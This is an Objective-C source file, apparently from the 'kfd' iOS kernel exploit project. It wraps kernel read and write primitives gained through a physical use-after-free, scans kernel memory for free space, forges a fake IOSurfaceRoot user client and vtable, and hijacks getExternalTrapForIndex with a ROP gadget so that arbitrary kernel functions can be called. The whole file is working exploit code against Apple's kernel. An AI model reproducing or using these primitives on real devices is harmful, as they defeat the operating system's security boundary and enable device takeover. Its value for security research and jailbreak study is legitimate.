//
//  krw.m
//  kfd
//
//  Created by Seo Hyun-gyu on 2023/08/10.
//

#import <Foundation/Foundation.h>
#import "krw.h"
#import "libkfd.h"
#import "offsets.h"

uint64_t _kfd = 0;

uint64_t do_kopen(uint64_t puaf_pages, uint64_t puaf_method, uint64_t kread_method, uint64_t kwrite_method)
{
    printf("do_kopen arg: 0x%llx, 0x%llx, 0x%llx, 0x%llx\n", puaf_pages, puaf_method, kread_method, kwrite_method);
    _kfd = kopen(puaf_pages, puaf_method, kread_method, kwrite_method);//kopen_intermediate(puaf_pages, puaf_method, kread_method, kwrite_method);
    return _kfd;
}

void do_kclose(void)
{
    kclose(_kfd);
}

void do_kread(uint64_t kaddr, void* uaddr, uint64_t size)
{
    kread(_kfd, kaddr, uaddr, size);
}

void do_kwrite(void* uaddr, uint64_t kaddr, uint64_t size)
{
    kwrite(_kfd, uaddr, kaddr, size);
}

uint64_t get_kslide(void) {
    //kfd->info.kernel.kernel_slide
    return ((struct kfd*)_kfd)->info.kernel.kernel_slide;
}

uint64_t get_kernproc(void) {
    return ((struct kfd*)_kfd)->info.kernel.kernel_proc;
}

uint8_t kread8(uint64_t where) {
    uint8_t out;
    kread(_kfd, where, &out, sizeof(uint8_t));
    return out;
}
uint32_t kread16(uint64_t where) {
    uint16_t out;
    kread(_kfd, where, &out, sizeof(uint16_t));
    return out;
}
uint32_t kread32(uint64_t where) {
    uint32_t out;
    kread(_kfd, where, &out, sizeof(uint32_t));
    return out;
}
uint64_t kread64(uint64_t where) {
    uint64_t out;
    kread(_kfd, where, &out, sizeof(uint64_t));
    return out;
}

void kwrite8(uint64_t where, uint8_t what) {
    uint8_t _buf[8] = {};
    _buf[0] = what;
    _buf[1] = kread8(where+1);
    _buf[2] = kread8(where+2);
    _buf[3] = kread8(where+3);
    _buf[4] = kread8(where+4);
    _buf[5] = kread8(where+5);
    _buf[6] = kread8(where+6);
    _buf[7] = kread8(where+7);
    kwrite((u64)(_kfd), &_buf, where, sizeof(u64));
}

void kwrite16(uint64_t where, uint16_t what) {
    u16 _buf[4] = {};
    _buf[0] = what;
    _buf[1] = kread16(where+2);
    _buf[2] = kread16(where+4);
    _buf[3] = kread16(where+6);
    kwrite((u64)(_kfd), &_buf, where, sizeof(u64));
}

void kwrite32(uint64_t where, uint32_t what) {
    u32 _buf[2] = {};
    _buf[0] = what;
    _buf[1] = kread32(where+4);
    kwrite((u64)(_kfd), &_buf, where, sizeof(u64));
}
void kwrite64(uint64_t where, uint64_t what) {
    u64 _buf[1] = {};
    _buf[0] = what;
    kwrite((u64)(_kfd), &_buf, where, sizeof(u64));
}

void kreadbuf(uint64_t kaddr, void* output, size_t size)
{
    uint64_t endAddr = kaddr + size;
    uint32_t outputOffset = 0;
    unsigned char* outputBytes = (unsigned char*)output;
    
    for(uint64_t curAddr = kaddr; curAddr < endAddr; curAddr += 4)
    {
        uint32_t k = kread32(curAddr);

        unsigned char* kb = (unsigned char*)&k;
        for(int i = 0; i < 4; i++)
        {
            if(outputOffset == size) break;
            outputBytes[outputOffset] = kb[i];
            outputOffset++;
        }
        if(outputOffset == size) break;
    }
}

//Thanks @Mineek!
mach_port_t user_client;
uint64_t fake_client;

// FIXME: Currently just finds a zerobuf in memory, this can be overwritten at ANY time, and thus is really unstable and unreliable. Once you get the unstable kcall, use that to bootstrap a stable kcall primitive, not using dirty_kalloc.
 uint64_t dirty_kalloc(size_t size) {
     uint64_t begin = get_kernproc();//kfd_struct->info.kernel.kernel_proc;
     uint64_t end = begin + 0x40000000;
     uint64_t addr = begin;
     while (addr < end) {
         bool found = false;
         for (int i = 0; i < size; i+=4) {
             uint32_t val = kread32(addr+i);
             found = true;
             if (val != 0) {
                 found = false;
                 addr += i;
                 break;
             }
         }
         if (found) {
             printf("[+] dirty_kalloc: 0x%llx\n", addr);
             return addr;
         }
         addr += 0x1000;
     }
     if (addr >= end) {
         printf("[-] failed to find free space in kernel\n");
         exit(EXIT_FAILURE);
     }
     return 0;
 }

void init_kcall(void) {
     io_service_t service = IOServiceGetMatchingService(kIOMasterPortDefault, IOServiceMatching("IOSurfaceRoot"));
     if (service == IO_OBJECT_NULL){
       printf(" [-] unable to find service\n");
       exit(EXIT_FAILURE);
     }
     kern_return_t err = IOServiceOpen(service, mach_task_self(), 0, &user_client);
     if (err != KERN_SUCCESS){
       printf(" [-] unable to get user client connection\n");
       exit(EXIT_FAILURE);
     }
    printf("user_client: 0x%lx\n", user_client);
     uint64_t uc_port = port_name_to_ipc_port(user_client);//find_port(user_client);
     printf("Found port: 0x%llx\n", uc_port);
     uint64_t uc_addr = kread64(uc_port + 0x58);//0x58 = OFFSET(ipc_port, ip_kobject));
     printf("Found addr: 0x%llx\n", uc_addr);
    printf("pid? %d\n", kread32(uc_addr + 0x8));
     uint64_t uc_vtab = kread64(uc_addr);
     printf("Found vtab: 0x%llx\n", uc_vtab);
     uint64_t fake_vtable = dirty_kalloc(0x1000);
     printf("Created fake_vtable at %016llx\n", fake_vtable);
     for (int i = 0; i < 0x200; i++) {
         kwrite64(fake_vtable+i*8, kread64(uc_vtab+i*8));
     }
     printf("Copied some of the vtable over\n");
     fake_client = dirty_kalloc(0x1000);
     printf("Created fake_client at 0x%016llx\n", fake_client);
     for (int i = 0; i < 0x200; i++) {
         kwrite64(fake_client+i*8, kread64(uc_addr+i*8));
     }
     printf("Copied the user client over\n");
     kwrite64(fake_client, fake_vtable);
     kwrite64(uc_port + 0x58, fake_client);//0x58 = OFFSET(ipc_port, ip_kobject));
     uint64_t add_x0_x0_0x40_ret = off_add_x0_x0_0x40_ret;
    printf("off_add_x0_x0_0x40_ret: 0x%llx, kslide: 0x%x\n", off_add_x0_x0_0x40_ret, get_kslide());
     add_x0_x0_0x40_ret += get_kslide();
    printf("kread64 ret: 0x%llx\n", kread64(add_x0_x0_0x40_ret));
    //b7, b8, b6
//    for(int i = 0; i < 1000; i++) {
//        kwrite64(fake_vtable+8*(0xb8 + i*2), add_x0_x0_0x40_ret);
//    }
     kwrite64(fake_vtable+8*0xB8, add_x0_x0_0x40_ret);
     printf("Wrote the `add x0, x0, #0x40; ret;` gadget over getExternalTrapForIndex\n");
 }

 uint64_t kcall(uint64_t addr, uint64_t x0, uint64_t x1, uint64_t x2, uint64_t x3, uint64_t x4, uint64_t x5, uint64_t x6) {
     uint64_t offx20 = kread64(fake_client+0x40);
     uint64_t offx28 = kread64(fake_client+0x48);
     kwrite64(fake_client+0x40, x0);
     kwrite64(fake_client+0x48, addr);
     printf("user_client: 0x%lx\n", user_client);
     uint64_t returnval = IOConnectTrap6(user_client, 0, (uint64_t)(x1), (uint64_t)(x2), (uint64_t)(x3), (uint64_t)(x4), (uint64_t)(x5), (uint64_t)(x6));
     kwrite64(fake_client+0x40, offx20);
     kwrite64(fake_client+0x48, offx28);
     return returnval;
 }

uint64_t ZmFixAddr(uint64_t addr) {
    static kmap_hdr_t zm_hdr = {0, 0, 0, 0};
    
    if (zm_hdr.start == 0) {
        // xxx rk64(0) ?!
        uint64_t zone_map = kread64(off_zone_map + get_kslide());
        printf("zone_map kread64: 0x%llx\n", zone_map);
        // hdr is at offset 0x10, mutexes at start
        kreadbuf(zone_map + 0x10, &zm_hdr, sizeof(zm_hdr));
        //printf("zm_range: 0x%llx - 0x%llx (read 0x%zx, exp 0x%zx)\n", zm_hdr.start, zm_hdr.end, r, sizeof(zm_hdr));
        
        if (zm_hdr.start == 0 || zm_hdr.end == 0) {
            printf("[-] KernelRead of zone_map failed!\n");
//            return 1;
        }
        
        printf("zm_hdr.end: 0x%llx, zm_hdr.start: 0x%llx\n", zm_hdr.end, zm_hdr.start);
        
//        if (zm_hdr.end - zm_hdr.start > 0x100000000) {
//            printf("[-] zone_map is too big, sorry.\n");
//            return 1;
//        }
    }
    
    uint64_t zm_tmp = (zm_hdr.start & 0xffffffff00000000) | ((addr) & 0xffffffff);
    
    return zm_tmp < zm_hdr.start ? zm_tmp + 0x100000000 : zm_tmp;
}
